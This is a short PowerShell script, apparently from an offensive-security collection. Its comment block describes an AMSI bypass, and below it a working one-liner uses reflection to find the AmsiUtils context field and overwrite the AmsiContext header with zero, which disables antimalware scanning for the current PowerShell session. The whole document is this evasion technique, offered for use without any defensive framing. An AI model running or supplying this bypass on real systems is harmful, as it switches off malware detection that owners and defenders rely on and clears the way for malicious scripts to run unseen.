<# AMSI bypass by corrupting the AmsiContext header and shutting down the AmsiOpenProcess function(from amsi.dll). This only "corrupts" our powershell session, but if we open a new one, AMSI will be up again. 

Powershell oneliner to modify the AmsiContext header:
#>
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
